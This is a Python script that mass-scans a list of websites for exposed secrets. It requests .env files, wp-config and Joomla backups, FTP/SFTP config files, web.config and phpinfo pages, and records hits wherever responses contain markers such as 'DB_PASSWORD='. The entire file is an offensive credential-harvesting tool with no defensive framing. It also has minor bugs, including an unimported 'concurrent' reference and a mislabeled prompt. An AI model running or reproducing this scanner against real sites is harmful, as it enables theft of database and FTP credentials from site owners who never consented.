import requests
import os
from concurrent.futures import ThreadPoolExecutor

def add_http(lists):
    try:
        for i in range(len(lists)):
            if not lists[i].startswith("http"):
                lists[i] = "http://" + lists[i]
    except KeyboardInterrupt:
        print("\033[95m[-] Canceled !.\033[0m")
        exit()
    return lists
try:
  urls = input("\033[93m[+] Target : \033[0m")
  power = int(input("\033[93m[+] Target : \033[0m"))
except KeyboardInterrupt:
    print("\n\033[95m[-] Canceled !.\033[0m")
    exit()

try:
    with open(urls, "r") as file:
        lists = file.read().splitlines()
except FileNotFoundError:
    print("\033[91mList Not Found !.\033[0m")
    exit()
except KeyboardInterrupt:
    print("\n\033[95m[-] Canceled !.\033[0m")
    exit()
webs = add_http(lists)

def send_request(url):
    try:
        response = requests.get(url, timeout=3)
        return response.text
    except requests.exceptions.RequestException as e:
        return ""
def post_request(url):
    try:
        response = requests.post(url, timeout=3)
        return response.text
    except requests.exceptions.RequestException as e:
        return ""

list = [
        "/.env",
        "/.env-old",
        "/.env.old",
        "/.env-bak",
        "/.env.server",
        "/.env.backup",
        "/.env-backup",
        "/.env.bak",
        "/.env.dev",
        "/phpinfo.php",
        "/info.php",
        "/i.php",
        "/php.php",
        "/test.php",
        "/.vscode/sftp.json",
        "/sftp.json",
        "/config/ftp.config",
        "/sftp-config.json",
        "/ftp.conf",
        "/ftp.config",
        "/ftp-config.conf",
        "/ftp-config.json",
        "/ftps.conf",
        "/ftps.config",
        "/configuration.php.bak",
        "/configuration.php-dist",
        "/wp-config.php.bak",
        "/wp-config.php-dist",
        "/wp-config.php-bak",
        "/wp-config.php-old",
        "/wp-config.php.old",
        "/modules/web.config",
        "/web.config",
        "/web/config/ftp.config",
        "/web.config.bak",
        "/wp-config.php.old",
        "/register",
        "/admin/register",
        "/backend/register",
        "/auth/register",
    ]
def check_vulnerabilities(target, file):
    try:
        post = post_request(target+"/register")
        vuln = send_request(target+file)
        if "DB_PASSWORD=" in vuln:
          print("\033[92m[+] ", target+file, " -> ENV\033[0m")
          with open("env.txt", 'a') as env:
            env.write(target+file + "\n")
        elif "DB_USERNAME" in post:
          print("\033[92m[+] ", target, " -> POST Misconf\033[0m")
          with open("POST-misconf.txt", 'a') as pmisc:
            pmisc.write(target + "\n")
        elif "[authentication]" in vuln:
          print("\033[92m[+] ", target+file, " -> FTP Config\033[0m")
          with open("FTP-Config.txt", 'a') as ftpc:
            ftpc.write(target+file + "\n")
        elif "<add name=" in vuln:
          print("\033[92m[+] ", target+file, " -> WEB Config\033[0m")
          with open("WEB-Config.txt", 'a') as webc:
            webc.write(target+file + "\n")
        elif "'DB_PASSWORD'," in vuln:
          print("\033[92m[+] ", target+file, " -> WP-Config\033[0m")
          with open("WP-Config.txt", 'a') as wp:
            wp.write(target+file + "\n")
        elif '"username":' in vuln:
          print("\033[92m[+] ", target+file, " -> FTP Json\033[0m")
          with open("FTP-Json.txt", 'a') as ftpj:
            ftpj.write(target+file + "\n")
        elif "Database Settings" in vuln:
          print("\033[92m[+] ", target+file, " -> Joomla Config\033[0m")
          with open("Joomla-Config.txt", 'a') as jconf:
            jconf.write(target+file + "\n")
        elif "PHP License" in vuln:
          print("\033[92m[+] ", target+file, " -> PHPINFO\033[0m")
          with open("phpinfo.txt", 'a') as pinfo:
            pinfo.write(target+file + "\n")
        elif 'password-confirm' in vuln:
          print("\033[92m[+] ", target+file, " -> Register Page\033[0m")
          with open("register.txt", 'a') as reg:
            reg.write(target+file + "\n")
        else:
          print("\033[91m[-] ", target+file, " -> NOT FOUND\033[0m")
    except KeyboardInterrupt:
        print("\n\033[95m[-] Canceled !.\033[0m")
        exit()
with ThreadPoolExecutor(max_workers=power) as executor:
    results = [executor.submit(check_vulnerabilities, target, file) for target in webs for file in list]
    for f in concurrent.futures.as_completed(results):
        try:
            data = f.result()
        except Exception as e:
            print(e)
print("\033[92mRESULT SAVED AS TXT FILE\033[0m")
